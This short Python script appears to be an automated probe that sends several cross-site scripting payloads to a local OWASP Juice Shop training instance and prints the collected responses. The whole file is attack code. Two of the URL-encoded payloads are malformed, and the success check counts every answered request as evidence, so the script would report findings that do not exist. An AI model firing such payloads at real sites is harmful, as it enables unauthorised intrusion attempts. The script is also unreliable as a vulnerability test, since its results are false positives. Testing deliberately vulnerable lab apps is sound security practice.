```python
import requests

evidence = []
stdout = ""
exit_code = 0

for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", 
                "%3Cscript%3Ealert%28%281%29%29%3B%3C%2Fscript%3E", 
                "%3Cimg%20src=%3Cx%3Enerror=alert%280%29%3E%3C%2Fimg%3E"]:
    try:
        response = requests.get(f"http://juice-shop:3000/{payload}")
        evidence.append(response.url)
        stdout += response.text
    except Exception as e:
        pass

exit_code = 1 if len(evidence) > 0 else 0

print({
    "evidence": evidence,
    "stdout": stdout,
    "exit_code": exit_code
})
```